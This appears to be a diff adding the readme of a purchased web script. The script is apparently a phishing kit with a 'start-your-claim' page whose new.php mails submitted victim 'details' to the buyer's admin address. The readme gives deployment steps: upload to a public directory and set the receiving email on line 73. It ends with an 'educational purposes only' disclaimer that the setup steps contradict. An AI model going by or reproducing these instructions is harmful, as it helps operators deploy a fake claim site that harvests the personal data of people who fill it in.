@@ -1,0 +1,32 @@
+
+// Thanks For Buying //
+
+
+
+*** How to upload scripts ***
+
+// Download and Extract the zip file to public directory or sub folder or sub domain
+
+
+
+*** How to Set Up SMTP ***
+
+Locate start-your-claim folder click on the new.php file and open the file and set it up Using default configurations on Email account in Cpanel
+
+go to line 73 and change  the email to you admin email the will receive the deatils 
+
+
+
+
+
+
+
+
+*********************************************************************
+**** This script is for educational purposes only. 
+We are not responsible for any illegal use of this script. ******
+********************************************************************
+
+
+
+
